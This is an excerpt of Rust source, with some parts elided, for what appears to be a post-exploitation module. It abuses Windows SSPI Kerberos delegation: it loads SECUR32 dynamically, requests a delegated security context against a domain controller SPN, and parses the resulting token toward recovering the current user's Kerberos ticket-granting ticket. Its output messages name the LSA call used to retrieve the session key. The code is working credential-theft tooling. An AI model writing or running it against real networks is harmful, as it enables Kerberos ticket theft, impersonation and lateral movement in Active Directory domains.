...
type AcquireCredentialsHandleAFn = unsafe extern "system" fn(
    *const u8, *const u8, u32, *const c_void, *const c_void, *const c_void, *const c_void,
    *mut SecHandle, *mut i64,
) -> i32;

type InitializeSecurityContextAFn = unsafe extern "system" fn(
    *const SecHandle, *const SecHandle, *const u8, u32, u32, u32,
    *const SecBufferDesc, u32, *mut SecHandle, *mut SecBufferDesc, *mut u32, *mut i64,
) -> i32;
...
fn main(args: *mut u8, len: usize) {
    ...
    let spn = if let Some(t) = target_spn {
        ...
        match get_domain_info() {
            ...
            None => { eprintln!("[X] Could not auto-detect DC. Use /target:SPN"); return; }
        }
    };
    ...
    unsafe {
        let secur32 = { let h = GetModuleHandleA(b"SECUR32\0".as_ptr()); if h.is_null() { LoadLibraryA(b"SECUR32\0".as_ptr()) } else { h } };
        if secur32.is_null() { eprintln!("[X] Failed to load SECUR32"); return; }

        let acq: AcquireCredentialsHandleAFn = core::mem::transmute(GetProcAddress(secur32, b"AcquireCredentialsHandleA\0".as_ptr()));
        let isc: InitializeSecurityContextAFn = core::mem::transmute(GetProcAddress(secur32, b"InitializeSecurityContextA\0".as_ptr()));
        let dsc: DeleteSecurityContextFn = core::mem::transmute(GetProcAddress(secur32, b"DeleteSecurityContext\0".as_ptr()));
        let fch: FreeCredentialsHandleFn = core::mem::transmute(GetProcAddress(secur32, b"FreeCredentialsHandle\0".as_ptr()));

        let mut cred_handle = SecHandle { dw_lower: 0, dw_upper: 0 };
        let mut expiry: i64 = 0;

        let status = acq(
            core::ptr::null(), b"Kerberos\0".as_ptr(), SECPKG_CRED_OUTBOUND,
            core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null(),
            &mut cred_handle, &mut expiry,
        );
        if status < 0 {
            eprintln!("[X] AcquireCredentialsHandle failed: 0x{:08x}", status as u32);
            return;
        }

        let mut out_buf = SecBuffer { cb_buffer: 0, buffer_type: SECBUFFER_TOKEN, pv_buffer: core::ptr::null_mut() };
        let mut out_desc = SecBufferDesc { ul_version: 0, c_buffers: 1, p_buffers: &mut out_buf };
        let mut ctx_handle = SecHandle { dw_lower: 0, dw_upper: 0 };
        let mut ctx_attrs: u32 = 0;

        let status = isc(
            &cred_handle, core::ptr::null(), spn_cstr.as_ptr(),
            ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH,
            0, SECURITY_NATIVE_DREP,
            core::ptr::null(), 0,
            &mut ctx_handle, &mut out_desc, &mut ctx_attrs, core::ptr::null_mut(),
        );

        if status < 0 && status != 0x00090312 {
            eprintln!("[X] InitializeSecurityContext failed: 0x{:08x}", status as u32);
            fch(&mut cred_handle);
            return;
        }
        ...
        let token = core::slice::from_raw_parts(out_buf.pv_buffer as *const u8, out_buf.cb_buffer as usize);
        println!("[*] Got SSPI output token: {} bytes", token.len());

        let krb5_oid: &[u8] = &[0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02];
        ...
        let start = match oid_pos {
            ...
            None => { eprintln!("[X] Kerberos OID not found in SSPI token"); dsc(&mut ctx_handle); fch(&mut cred_handle); return; }
        };
        ...
        println!("[!] Full TGT extraction requires decrypting the authenticator with the session key from the ticket cache");
        println!("[!] This requires LsaCallAuthenticationPackage(KerbRetrieveEncodedTicketMessage) to get the session key");
